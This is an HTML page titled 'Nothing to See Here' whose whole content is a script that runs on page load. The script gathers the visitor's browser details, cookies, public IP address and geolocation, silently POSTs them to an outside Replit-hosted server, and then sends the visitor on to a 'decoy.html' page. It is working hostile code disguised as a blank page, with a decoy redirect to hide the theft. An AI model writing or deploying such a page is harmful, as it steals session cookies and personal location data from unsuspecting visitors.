<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Nothing to See Here</title>
</head>
<body>
  <script>
    async function grabAndSendData() {
      let data = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${window.screen.width}x${window.screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookies: document.cookie || "No cookies found"
      };

      // IP
      try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        data.ip = ipData.ip;
      } catch (e) {
        data.ip_error = `IP fetch failed: ${e.message}`;
      }

      // Geolocation
      if (navigator.geolocation) {
        try {
          const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
          });
          data.latitude = position.coords.latitude;
          data.longitude = position.coords.longitude;
          data.accuracy = position.coords.accuracy;
        } catch (err) {
          data.geolocation_error = `Geolocation blocked: ${err.message}`;
        }
      } else {
        data.geolocation_error = "Geolocation not supported";
      }

      // Send to your server
      try {
        await fetch('https://30cc0d92-794b-4436-8686-0d77c24a3b3c-00-evkmeitbxruz.sisko.replit.dev/send-data', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data)
        });
      } catch (err) {
        console.error('❌ Failed to send to server:', err);
      }

      // Redirect
      setTimeout(() => {
        window.location.href = 'decoy.html';
      }, 1000);
    }

    window.onload = grabAndSendData;
  </script>
</body>
</html>
